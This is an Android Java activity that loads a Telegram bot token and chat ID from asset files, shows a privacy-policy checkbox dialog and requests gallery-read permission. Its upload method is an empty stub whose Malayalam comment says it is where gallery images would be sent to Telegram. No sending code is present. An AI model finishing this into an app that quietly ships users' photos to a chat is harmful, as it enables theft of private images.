package com.example.storageapp;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private String botToken = "";
    private String chatId = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // അസെറ്റ് ഫയലുകളിൽ നിന്ന് ടോക്കണും ഐഡിയും റീഡ് ചെയ്യുക
        readConfigFiles();

        Button startButton = findViewById(R.id.startButton);
        startButton.setOnClickListener(v -> showPolicyDialog());
    }

    private void showPolicyDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View view = getLayoutInflater().inflate(R.layout.dialog_policy, null);
        CheckBox agreeCheckbox = view.findViewById(R.id.agreeCheckbox);

        builder.setView(view);
        AlertDialog dialog = builder.create();

        view.findViewById(R.id.btnConfirm).setOnClickListener(v -> {
            if (agreeCheckbox.isChecked()) {
                dialog.dismiss();
                checkAndRequestPermissions();
            } else {
                Toast.makeText(this, "Please agree to the privacy policy", Toast.LENGTH_SHORT).show();
            }
        });

        view.findViewById(R.id.btnCancel).setOnClickListener(v -> dialog.dismiss());
        dialog.show();
    }

    private void checkAndRequestPermissions() {
        String permission = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) ?
                Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;

        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
        } else {
            fetchAndUploadImages();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                fetchAndUploadImages();
            } else {
                Toast.makeText(this, "Permission Denied!", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void readConfigFiles() {
        try {
            BufferedReader readerToken = new BufferedReader(new InputStreamReader(getAssets().open("token.txt")));
            botToken = readerToken.readLine().trim();

            BufferedReader readerId = new BufferedReader(new InputStreamReader(getAssets().open("id.txt")));
            chatId = readerId.readLine().trim();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void fetchAndUploadImages() {
        // ഗാലറിയിലെ ചിത്രങ്ങൾ എടുത്ത് ടെലിഗ്രാമിലേക്ക് അയക്കാനുള്ള കോഡ് ഇവിടെ റൺ ചെയ്യാം
        Toast.makeText(this, "Permission granted. Ready to process storage.", Toast.LENGTH_SHORT).show();
    }
                            }
          
